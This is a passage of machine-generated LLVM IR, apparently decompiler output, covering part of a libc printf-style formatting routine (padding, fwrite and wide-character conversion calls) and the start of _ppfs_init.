  %v2_804e57a = add i32 %v1_804e57a, %v0_804e57a
  %v13_804e57a = icmp slt i32 %v2_804e57a, 0
  store i1 %v13_804e57a, i1* %sf.global-to-local, align 1
  store i32 %v2_804e57a, i32* @ebx, align 4
  %v1_804e57c = add i32 %v0_804e573, 8
  %v2_804e57c = inttoptr i32 %v1_804e57c to i32*
  store i32 0, i32* %v2_804e57c, align 4
  %v0_804e584.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e584

dec_label_pc_804e584:                             ; preds = %dec_label_pc_804e569, %dec_label_pc_804e57a
  %v0_804e58b = phi i32 [ %v0_804e573, %dec_label_pc_804e569 ], [ %v0_804e584.pre, %dec_label_pc_804e57a ]
  %v1_804e584 = add i32 %v0_804e58b, 32
  %v2_804e584 = inttoptr i32 %v1_804e584 to i8*
  %v3_804e584 = load i8, i8* %v2_804e584, align 1
  %v4_804e584 = and i8 %v3_804e584, 8
  %v5_804e584 = icmp eq i8 %v4_804e584, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e589 = icmp eq i1 %v5_804e584, false
  br i1 %v1_804e589, label %dec_label_pc_804e5b2, label %dec_label_pc_804e58b

dec_label_pc_804e58b:                             ; preds = %dec_label_pc_804e584
  %v1_804e58b = add i32 %v0_804e58b, 8
  %v2_804e58b = inttoptr i32 %v1_804e58b to i32*
  %v3_804e58b = load i32, i32* %v2_804e58b, align 4
  store i32 %v3_804e58b, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e594 = add i32 %v0_804e58b, 368
  %v2_804e594 = inttoptr i32 %v1_804e594 to i32*
  %v3_804e594 = load i32, i32* %v2_804e594, align 4
  store i32 %v3_804e594, i32* @eax, align 4
  %v0_804e59b = call i32 @_charpad()
  store i32 %v0_804e59b, i32* %eax.global-to-local, align 4
  %v1_804e5a0 = load i32, i32* @esp, align 4
  %v2_804e5a0 = add i32 %v1_804e5a0, 8
  %v3_804e5a0 = inttoptr i32 %v2_804e5a0 to i32*
  %v4_804e5a0 = load i32, i32* %v3_804e5a0, align 4
  %v5_804e5a0 = sub i32 %v0_804e59b, %v4_804e5a0
  %v15_804e5a0 = icmp eq i32 %v5_804e5a0, 0
  %v16_804e5a0 = icmp slt i32 %v5_804e5a0, 0
  store i1 %v16_804e5a0, i1* %sf.global-to-local, align 1
  %v1_804e5a4 = icmp eq i1 %v15_804e5a0, false
  br i1 %v1_804e5a4, label %dec_label_pc_804e69f, label %dec_label_pc_804e5aa

dec_label_pc_804e5aa:                             ; preds = %dec_label_pc_804e58b
  store i32 0, i32* %v3_804e5a0, align 4
  %v1_804e5b2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e5b2

dec_label_pc_804e5b2:                             ; preds = %dec_label_pc_804e584, %dec_label_pc_804e5aa
  %v1_804e5b2 = phi i32 [ %v0_804e58b, %dec_label_pc_804e584 ], [ %v1_804e5b2.pre, %dec_label_pc_804e5aa ]
  %v0_804e5b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e5b2 = add i32 %v1_804e5b2, -4
  %v3_804e5b2 = inttoptr i32 %v2_804e5b2 to i32*
  store i32 %v0_804e5b2, i32* %v3_804e5b2, align 4
  %v0_804e5b3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e5b3 = add i32 %v1_804e5b2, -8
  %v3_804e5b3 = inttoptr i32 %v2_804e5b3 to i32*
  store i32 %v0_804e5b3, i32* %v3_804e5b3, align 4
  %v1_804e5b4 = add i32 %v1_804e5b2, 368
  %v2_804e5b4 = inttoptr i32 %v1_804e5b4 to i32*
  %v3_804e5b4 = load i32, i32* %v2_804e5b4, align 4
  %v5_804e5b4 = add i32 %v1_804e5b2, -12
  %v6_804e5b4 = inttoptr i32 %v5_804e5b4 to i32*
  store i32 %v3_804e5b4, i32* %v6_804e5b4, align 4
  %v0_804e5bb = load i32, i32* @ebp, align 4
  %v1_804e5bb = add i32 %v0_804e5bb, ptrtoint (i32* @global_var_8050bad.116 to i32)
  store i32 %v1_804e5bb, i32* %eax.global-to-local, align 4
  %v2_804e5c1 = add i32 %v1_804e5b2, -16
  %v3_804e5c1 = inttoptr i32 %v2_804e5c1 to i32*
  store i32 %v1_804e5bb, i32* %v3_804e5c1, align 4
  %v0_804e5c2 = call i32 @__GI_fputs_unlocked()
  store i32 %v0_804e5c2, i32* %eax.global-to-local, align 4
  %v0_804e5c7 = load i32, i32* @esp, align 4
  %v1_804e5c7 = add i32 %v0_804e5c7, 384
  %v2_804e5c7 = inttoptr i32 %v1_804e5c7 to i32*
  %v3_804e5c7 = load i32, i32* %v2_804e5c7, align 4
  store i32 %v3_804e5c7, i32* @eax, align 4
  %v0_804e5ce = load i32, i32* @ebx, align 4
  store i32 %v0_804e5ce, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804e5d5 = call i32 @_charpad()
  store i32 %v0_804e5d5, i32* %eax.global-to-local, align 4
  %v0_804e5da = load i32, i32* @esp, align 4
  %v1_804e5da = add i32 %v0_804e5da, 16
  %v1_804e5dd = load i32, i32* @ebx, align 4
  %v2_804e5dd = sub i32 %v0_804e5d5, %v1_804e5dd
  %v12_804e5dd = icmp eq i32 %v2_804e5dd, 0
  %v13_804e5dd = icmp slt i32 %v2_804e5dd, 0
  store i1 %v13_804e5dd, i1* %sf.global-to-local, align 1
  %v1_804e5df = icmp eq i1 %v12_804e5dd, false
  br i1 %v1_804e5df, label %dec_label_pc_804e69f, label %dec_label_pc_804e5e5

dec_label_pc_804e5e5:                             ; preds = %dec_label_pc_804e5b2
  %v1_804e5e5 = add i32 %v0_804e5da, 356
  %v2_804e5e5 = inttoptr i32 %v1_804e5e5 to i32*
  %v3_804e5e5 = load i32, i32* %v2_804e5e5, align 4
  %v4_804e5e5 = icmp eq i32 %v3_804e5e5, 0
  %v5_804e5e5 = icmp slt i32 %v3_804e5e5, 0
  store i1 %v5_804e5e5, i1* %sf.global-to-local, align 1
  %v1_804e5ed = icmp eq i1 %v4_804e5e5, false
  br i1 %v1_804e5ed, label %dec_label_pc_804e611, label %dec_label_pc_804e5ef

dec_label_pc_804e5ef:                             ; preds = %dec_label_pc_804e5e5
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e5f1 = load i32, i32* @esi, align 4
  %v1_804e5f1 = icmp eq i32 %v0_804e5f1, 0
  %v2_804e5f1 = icmp slt i32 %v0_804e5f1, 0
  store i1 %v2_804e5f1, i1* %sf.global-to-local, align 1
  br i1 %v1_804e5f1, label %dec_label_pc_804e607, label %dec_label_pc_804e5f5

dec_label_pc_804e5f5:                             ; preds = %dec_label_pc_804e5ef
  %v2_804e5f5 = add i32 %v0_804e5da, 12
  %v3_804e5f5 = inttoptr i32 %v2_804e5f5 to i32*
  store i32 0, i32* %v3_804e5f5, align 4
  %v1_804e5f6 = add i32 %v0_804e5da, 384
  %v2_804e5f6 = inttoptr i32 %v1_804e5f6 to i32*
  %v3_804e5f6 = load i32, i32* %v2_804e5f6, align 4
  %v5_804e5f6 = add i32 %v0_804e5da, 8
  %v6_804e5f6 = inttoptr i32 %v5_804e5f6 to i32*
  store i32 %v3_804e5f6, i32* %v6_804e5f6, align 4
  %v0_804e5fd = load i32, i32* @esi, align 4
  %v2_804e5fd = add i32 %v0_804e5da, 4
  %v3_804e5fd = inttoptr i32 %v2_804e5fd to i32*
  store i32 %v0_804e5fd, i32* %v3_804e5fd, align 4
  %v0_804e5fe = load i32, i32* @edi, align 4
  %v3_804e5fe = inttoptr i32 %v0_804e5da to i32*
  store i32 %v0_804e5fe, i32* %v3_804e5fe, align 4
  %v0_804e5ff = load i32, i32* %stack_var_-364, align 4
  %v4_804e5ff = call i32 @__stdio_fwrite(i32 %v0_804e5ff, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e5ff, i32* %eax.global-to-local, align 4
  %v0_804e604 = load i32, i32* @esp, align 4
  %v1_804e604 = add i32 %v0_804e604, 16
  %v7_804e604 = icmp slt i32 %v1_804e604, 0
  store i1 %v7_804e604, i1* %sf.global-to-local, align 1
  %v1_804e607.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e607

dec_label_pc_804e607:                             ; preds = %dec_label_pc_804e5ef, %dec_label_pc_804e5f5
  %v0_804e67146 = phi i32 [ %v1_804e5da, %dec_label_pc_804e5ef ], [ %v1_804e604, %dec_label_pc_804e5f5 ]
  %v1_804e607 = phi i32 [ 0, %dec_label_pc_804e5ef ], [ %v1_804e607.pre, %dec_label_pc_804e5f5 ]
  %v0_804e607 = phi i32 [ 0, %dec_label_pc_804e5ef ], [ %v4_804e5ff, %dec_label_pc_804e5f5 ]
  %v2_804e607 = sub i32 %v0_804e607, %v1_804e607
  %v12_804e607 = icmp eq i32 %v2_804e607, 0
  %v13_804e607 = icmp slt i32 %v2_804e607, 0
  store i1 %v13_804e607, i1* %sf.global-to-local, align 1
  %v1_804e609 = icmp eq i1 %v12_804e607, false
  br i1 %v1_804e609, label %dec_label_pc_804e69f, label %dec_label_pc_804e671

dec_label_pc_804e611:                             ; preds = %dec_label_pc_804e5e5
  %v1_804e611 = add i32 %v0_804e5da, 348
  %v2_804e611 = inttoptr i32 %v1_804e611 to i32*
  store i32 0, i32* %v2_804e611, align 4
  %v0_804e66d8 = load i32, i32* @esi, align 4
  %v1_804e66d9 = icmp eq i32 %v0_804e66d8, 0
  %v2_804e66d10 = icmp slt i32 %v0_804e66d8, 0
  store i1 %v2_804e66d10, i1* %sf.global-to-local, align 1
  %v1_804e66f16 = icmp eq i1 %v1_804e66d9, false
  %v0_804e61e.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e66f16, label %dec_label_pc_804e61e, label %dec_label_pc_804e671

dec_label_pc_804e61e:                             ; preds = %dec_label_pc_804e611, %dec_label_pc_804e66b
  %v0_804e625 = phi i32 [ %v2_804e66b, %dec_label_pc_804e66b ], [ %v0_804e66d8, %dec_label_pc_804e611 ]
  %v1_804e630 = phi i32 [ %v0_804e61e41, %dec_label_pc_804e66b ], [ %v0_804e61e.pre, %dec_label_pc_804e611 ]
  %v1_804e61e = add i32 %v1_804e630, 332
  store i32 %v1_804e61e, i32* %edx.global-to-local, align 4
  %v1_804e625 = add i32 %v0_804e625, -128
  %v2_804e625 = icmp ult i32 %v0_804e625, 128
  %v6_804e625 = icmp eq i32 %v1_804e625, 0
  %v7_804e625 = icmp slt i32 %v1_804e625, 0
  store i1 %v7_804e625, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804e630 = add i32 %v1_804e630, -4
  %v3_804e630 = inttoptr i32 %v2_804e630 to i32*
  store i32 %v1_804e61e, i32* %v3_804e630, align 4
  %v2_804e631 = or i1 %v2_804e625, %v6_804e625
  %v3_804e631 = load i32, i32* %eax.global-to-local, align 4
  %v4_804e631 = load i32, i32* @esi, align 4
  %v5_804e631 = select i1 %v2_804e631, i32 %v4_804e631, i32 %v3_804e631
  %v2_804e634 = add i32 %v1_804e630, -8
  %v3_804e634 = inttoptr i32 %v2_804e634 to i32*
  store i32 %v5_804e631, i32* %v3_804e634, align 4
  %v1_804e635 = add i32 %v1_804e630, 340
  store i32 %v1_804e635, i32* %eax.global-to-local, align 4
  %v2_804e63c = add i32 %v1_804e630, -12
  %v3_804e63c = inttoptr i32 %v2_804e63c to i32*
  store i32 %v1_804e635, i32* %v3_804e63c, align 4
  %v1_804e63d = add i32 %v1_804e630, 204
  store i32 %v1_804e63d, i32* @edi, align 4
  %v2_804e644 = add i32 %v1_804e630, -16
  %v3_804e644 = inttoptr i32 %v2_804e644 to i32*
  store i32 %v1_804e63d, i32* %v3_804e644, align 4
  %v0_804e645 = call i32 @__GI_wcsrtombs()
  %v0_804e64a = load i32, i32* @esp, align 4
  %v1_804e64a = add i32 %v0_804e64a, 16
  store i32 %v0_804e645, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e651 = icmp eq i32 %v0_804e645, 0
  %v2_804e651 = icmp slt i32 %v0_804e645, 0
  store i1 %v2_804e651, i1* %sf.global-to-local, align 1
  br i1 %v1_804e651, label %dec_label_pc_804e667, label %dec_label_pc_804e655

dec_label_pc_804e655:                             ; preds = %dec_label_pc_804e61e
  %v0_804e655 = load i32, i32* @ebp, align 4
  %v2_804e655 = add i32 %v0_804e64a, 12
  %v3_804e655 = inttoptr i32 %v2_804e655 to i32*
  store i32 %v0_804e655, i32* %v3_804e655, align 4
  %v1_804e656 = add i32 %v0_804e64a, 384
  %v2_804e656 = inttoptr i32 %v1_804e656 to i32*
  %v3_804e656 = load i32, i32* %v2_804e656, align 4
  %v5_804e656 = add i32 %v0_804e64a, 8
  %v6_804e656 = inttoptr i32 %v5_804e656 to i32*
  store i32 %v3_804e656, i32* %v6_804e656, align 4
  %v2_804e65d = add i32 %v0_804e64a, 4
  %v3_804e65d = inttoptr i32 %v2_804e65d to i32*
  store i32 %v0_804e645, i32* %v3_804e65d, align 4
  %v0_804e65e = load i32, i32* @edi, align 4
  %v3_804e65e = inttoptr i32 %v0_804e64a to i32*
  store i32 %v0_804e65e, i32* %v3_804e65e, align 4
  %v0_804e65f = load i32, i32* %stack_var_-364, align 4
  %v4_804e65f = call i32 @__stdio_fwrite(i32 %v0_804e65f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e65f, i32* %eax.global-to-local, align 4
  %v0_804e664 = load i32, i32* @esp, align 4
  %v1_804e664 = add i32 %v0_804e664, 16
  %v7_804e664 = icmp slt i32 %v1_804e664, 0
  store i1 %v7_804e664, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e667

dec_label_pc_804e667:                             ; preds = %dec_label_pc_804e61e, %dec_label_pc_804e655
  %v1_804e66b = phi i32 [ 0, %dec_label_pc_804e61e ], [ %v4_804e65f, %dec_label_pc_804e655 ]
  %v0_804e61e41 = phi i32 [ %v1_804e64a, %dec_label_pc_804e61e ], [ %v1_804e664, %dec_label_pc_804e655 ]
  %v2_804e667 = sub i32 %v1_804e66b, %v0_804e645
  %v12_804e667 = icmp eq i32 %v2_804e667, 0
  %v13_804e667 = icmp slt i32 %v2_804e667, 0
  store i1 %v13_804e667, i1* %sf.global-to-local, align 1
  %v1_804e669 = icmp eq i1 %v12_804e667, false
  br i1 %v1_804e669, label %dec_label_pc_804e69f, label %dec_label_pc_804e66b

dec_label_pc_804e66b:                             ; preds = %dec_label_pc_804e667
  %v0_804e66b = load i32, i32* @esi, align 4
  %v2_804e66b = sub i32 %v0_804e66b, %v1_804e66b
  %v12_804e66b = icmp eq i32 %v2_804e66b, 0
  %v13_804e66b = icmp slt i32 %v2_804e66b, 0
  store i32 %v2_804e66b, i32* @esi, align 4
  store i1 %v13_804e66b, i1* %sf.global-to-local, align 1
  %v1_804e66f = icmp eq i1 %v12_804e66b, false
  br i1 %v1_804e66f, label %dec_label_pc_804e61e, label %dec_label_pc_804e671

dec_label_pc_804e671:                             ; preds = %dec_label_pc_804e66b, %dec_label_pc_804e611, %dec_label_pc_804e607
  %v0_804e671 = phi i32 [ %v0_804e67146, %dec_label_pc_804e607 ], [ %v0_804e61e.pre, %dec_label_pc_804e611 ], [ %v0_804e61e41, %dec_label_pc_804e66b ]
  %v1_804e671 = add i32 %v0_804e671, 8
  %v2_804e671 = inttoptr i32 %v1_804e671 to i32*
  %v3_804e671 = load i32, i32* %v2_804e671, align 4
  store i32 %v3_804e671, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e67a = add i32 %v0_804e671, 368
  %v2_804e67a = inttoptr i32 %v1_804e67a to i32*
  %v3_804e67a = load i32, i32* %v2_804e67a, align 4
  store i32 %v3_804e67a, i32* @eax, align 4
  %v0_804e681 = call i32 @_charpad()
  store i32 %v0_804e681, i32* %eax.global-to-local, align 4
  %v1_804e686 = load i32, i32* @esp, align 4
  %v2_804e686 = add i32 %v1_804e686, 8
  %v3_804e686 = inttoptr i32 %v2_804e686 to i32*
  %v4_804e686 = load i32, i32* %v3_804e686, align 4
  %v5_804e686 = sub i32 %v0_804e681, %v4_804e686
  %v15_804e686 = icmp eq i32 %v5_804e686, 0
  %v16_804e686 = icmp slt i32 %v5_804e686, 0
  store i1 %v16_804e686, i1* %sf.global-to-local, align 1
  %v1_804e68a = icmp eq i1 %v15_804e686, false
  br i1 %v1_804e68a, label %dec_label_pc_804e69f, label %dec_label_pc_804e68c

dec_label_pc_804e68c:                             ; preds = %dec_label_pc_804e671, %dec_label_pc_804e3f9, %dec_label_pc_804e224
  %v0_804e68c = phi i32 [ %v1_804e686, %dec_label_pc_804e671 ], [ %v0_804e68c.pre, %dec_label_pc_804e3f9 ], [ %v1_804e242, %dec_label_pc_804e224 ]
  %v1_804e68c = add i32 %v0_804e68c, 16
  %v2_804e68c = inttoptr i32 %v1_804e68c to i32*
  %v3_804e68c = load i32, i32* %v2_804e68c, align 4
  store i32 %v3_804e68c, i32* @ebx, align 4
  store i32 %v3_804e68c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e17c.backedge

dec_label_pc_804e697:                             ; preds = %dec_label_pc_804e1ba
  %v1_804e697 = add i32 %v0_804e697, 2
  %v10_804e697 = icmp slt i32 %v1_804e697, 0
  store i1 %v10_804e697, i1* %sf.global-to-local, align 1
  store i32 %v1_804e697, i32* @ebx, align 4
  br label %dec_label_pc_804e17c.backedge

dec_label_pc_804e69f:                             ; preds = %dec_label_pc_804e1a6, %dec_label_pc_804e671, %dec_label_pc_804e607, %dec_label_pc_804e5b2, %dec_label_pc_804e58b, %dec_label_pc_804e4fb, %dec_label_pc_804e46e, %dec_label_pc_804e42f, %dec_label_pc_804e3d0, %dec_label_pc_804e667
  %v0_804e69f = phi i32 [ %v0_804e61e41, %dec_label_pc_804e667 ], [ %v0_804e69f.pre.pre, %dec_label_pc_804e1a6 ], [ %v1_804e686, %dec_label_pc_804e671 ], [ %v0_804e67146, %dec_label_pc_804e607 ], [ %v1_804e5da, %dec_label_pc_804e5b2 ], [ %v1_804e5a0, %dec_label_pc_804e58b ], [ %v0_804e21c.lcssa, %dec_label_pc_804e4fb ], [ %v1_804e486, %dec_label_pc_804e46e ], [ %v1_804e452, %dec_label_pc_804e42f ], [ %v1_804e3ee, %dec_label_pc_804e3d0 ]
  %v1_804e69f = inttoptr i32 %v0_804e69f to i32*
  store i32 -1, i32* %v1_804e69f, align 4
  br label %dec_label_pc_804e6a6

dec_label_pc_804e6a6:                             ; preds = %dec_label_pc_804e1b1, %dec_label_pc_804e11f, %dec_label_pc_804e13e, %dec_label_pc_804e69f
  %v0_804e6a6 = load i32, i32* @esp, align 4
  %v1_804e6a6 = inttoptr i32 %v0_804e6a6 to i32*
  %v2_804e6a6 = load i32, i32* %v1_804e6a6, align 4
  store i32 %v2_804e6a6, i32* %eax.global-to-local, align 4
  %v1_804e6a9 = add i32 %v0_804e6a6, 348
  %v10_804e6a9 = icmp slt i32 %v1_804e6a9, 0
  store i1 %v10_804e6a9, i1* %sf.global-to-local, align 1
  ret i32 %v2_804e6a6

; uselistorder directives
  uselistorder i32 %v1_804e697, { 1, 2, 0 }
  uselistorder i32 %v3_804e68c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804e671, { 1, 0 }
  uselistorder i32 %v2_804e66b, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804e64a, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e645, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804e625, { 1, 0 }
  uselistorder i32 %v0_804e61e.pre, { 1, 0 }
  uselistorder i32 %v0_804e5f1, { 1, 0 }
  uselistorder i32 %v3_804e5e5, { 1, 0 }
  uselistorder i32 %v0_804e5da, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804e5b2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e58b, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804e573, { 1, 0 }
  uselistorder i32 %v2_804e55f, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804e54c, { 1, 0 }
  uselistorder i32 %v1_804e549, { 1, 0 }
  uselistorder i32 %v1_804e53f, { 1, 0 }
  uselistorder i32 %v0_804e53f, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e51e, { 1, 0 }
  uselistorder i32 %v1_804e4fb, { 1, 0 }
  uselistorder i32 %v1_804e4b9, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804e4d5, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804e49e, { 1, 0 }
  uselistorder i32 %v1_804e489, { 1, 0 }
  uselistorder i32 %v1_804e455, { 1, 0 }
  uselistorder i32 %v0_804e42f, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804e415, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804e401, { 1, 0 }
  uselistorder i32 %v1_804e3b7, { 1, 0 }
  uselistorder i32 %v4_804e385, { 1, 0 }
  uselistorder i32 %v0_804e37a, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e375, { 1, 0 }
  uselistorder i32 %v0_804e3ae, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e365, { 1, 0 }
  uselistorder i32 %v1_804e35c, { 1, 0 }
  uselistorder i32 %v1_804e350, { 1, 0 }
  uselistorder i32 %v3_804e344, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e33a, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804e335, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804e333, { 1, 0 }
  uselistorder i32 %v0_804e385, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804e375, { 1, 2, 0 }
  uselistorder i32 %v3_804e30d, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804e2fb, { 1, 0 }
  uselistorder i32 %v4_804e2f2, { 1, 0 }
  uselistorder i32 %v3_804e2f2, { 1, 0 }
  uselistorder i32 %v6_804e2ea, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804e2bb, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804e2ba, { 2, 1, 0 }
  uselistorder i32 %v1_804e293, { 1, 0 }
  uselistorder i32 %v1_804e287, { 1, 0 }
  uselistorder i32 %v1_804e282, { 1, 0 }
  uselistorder i32 %v2_804e27a, { 1, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v3_804e264, { 1, 0, 2 }
  uselistorder i8 %v3_804e253, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804e24a, { 1, 0 }
  uselistorder i32 %v3_804e21c, { 6, 14, 1, 12, 13, 4, 5, 10, 9, 0, 11, 7, 15, 16, 8, 2, 3, 17, 18, 19 }
  uselistorder i32 %v0_804e21c.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e218, { 1, 0 }
  uselistorder i32 %v1_804e218.pre, { 1, 0 }
  uselistorder i32 %v1_804e217, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e214, { 1, 0 }
  uselistorder i32 %v2_804e21872, { 1, 0 }
  uselistorder i32 %v3_804e1fe, { 1, 0 }
  uselistorder i8 %v4_804e1ba, { 1, 0 }
  uselistorder i32 %v1_804e1ba, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804e1b1, { 1, 0 }
  uselistorder i32 %v2_804e186, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804e182, { 1, 0 }
  uselistorder i8 %v2_804e17c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e18a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e16c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 1, 6, 0, 5, 4, 3, 7, 8, 9, 10 }
  uselistorder i1* %sf.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 70, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 46, 47, 48, 49, 50, 44, 62, 63, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61 }
  uselistorder i32 -128, { 1, 0 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 19, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -17, { 2, 3, 4, 0, 1 }
  uselistorder i32 -32, { 1, 2, 0 }
  uselistorder i32 33, { 1, 2, 0 }
  uselistorder i32 15, { 5, 0, 4, 6, 1, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 11, { 5, 6, 7, 8, 3, 9, 0, 10, 11, 1, 2, 4, 12 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 45, { 0, 4, 1, 3, 2 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 60, { 0, 4, 5, 6, 7, 1, 8, 3, 2 }
  uselistorder i32 70, { 1, 0 }
  uselistorder i32 -16, { 2, 10, 6, 3, 7, 8, 9, 11, 12, 4, 13, 14, 0, 1, 26, 27, 28, 17, 19, 20, 16, 18, 5, 21, 15, 22, 23, 24, 25 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804e6a6, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e69f, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e667, { 1, 0 }
  uselistorder label %dec_label_pc_804e61e, { 1, 0 }
  uselistorder label %dec_label_pc_804e607, { 1, 0 }
  uselistorder label %dec_label_pc_804e5b2, { 1, 0 }
  uselistorder label %dec_label_pc_804e584, { 1, 0 }
  uselistorder label %dec_label_pc_804e569, { 1, 0 }
  uselistorder label %dec_label_pc_804e553, { 1, 0 }
  uselistorder label %dec_label_pc_804e53f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e53a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e4cc, { 1, 0 }
  uselistorder label %dec_label_pc_804e4b2, { 1, 0 }
  uselistorder label %dec_label_pc_804e3d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e375, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804e323, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e2d3, { 1, 0 }
  uselistorder label %dec_label_pc_804e2ba, { 1, 0 }
  uselistorder label %dec_label_pc_804e2a6, { 1, 0 }
  uselistorder label %dec_label_pc_804e2a1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e282, { 1, 0 }
  uselistorder label %dec_label_pc_804e20d, { 1, 0 }
  uselistorder label %dec_label_pc_804e205, { 1, 0 }
  uselistorder label %dec_label_pc_804e1b1, { 1, 0 }
  uselistorder label %dec_label_pc_804e1a6, { 1, 0 }
  uselistorder label %dec_label_pc_804e17c.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e6b4 = load i32, i32* @esi, align 4
  %v0_804e6b5 = load i32, i32* @ebx, align 4
  store i32 %v0_804e6b5, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804e6c9 = bitcast i32* %arg1 to i8*
  %v4_804e6c9 = call i32 @__GI_memset(i8* %v3_804e6c9, i32 0, i32 188)
  %v0_804e6ce = load i32, i32* @ebx, align 4
  %v1_804e6ce = add i32 %v0_804e6ce, 40
  store i32 %v1_804e6ce, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804e6d6 = add i32 %v0_804e6ce, 24
  %v2_804e6d6 = inttoptr i32 %v1_804e6d6 to i32*
  %v3_804e6d6 = load i32, i32* %v2_804e6d6, align 4
  %v4_804e6d6 = add i32 %v3_804e6d6, -1
  store i32 %v4_804e6d6, i32* %v2_804e6d6, align 4
  %v0_804e6dc = load i32, i32* @esi, align 4
  %v1_804e6dc = load i32, i32* @ebx, align 4
